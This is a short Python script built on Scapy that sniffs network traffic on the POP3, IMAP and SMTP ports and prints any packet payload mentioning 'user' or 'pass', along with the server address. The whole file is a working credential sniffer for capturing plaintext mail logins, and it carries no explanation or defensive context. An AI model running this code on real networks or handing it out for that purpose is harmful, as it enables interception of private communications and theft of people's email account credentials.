from scapy.all import *

def packet_callback(packet):
	if packet[TCP].payload:
		mail_packet = packet[TCP].payload
		if "user" in str(mail_packet).lower() or "pass" in str(mail_packet).lower():
			print("[*] Server: %s" % packet[IP].dst)
			print("[*] %s" % packet[TCP].payload)

sniff(filter="tcp and (port 110 or port 143 or port 25)",prn=packet_callback,store=0)
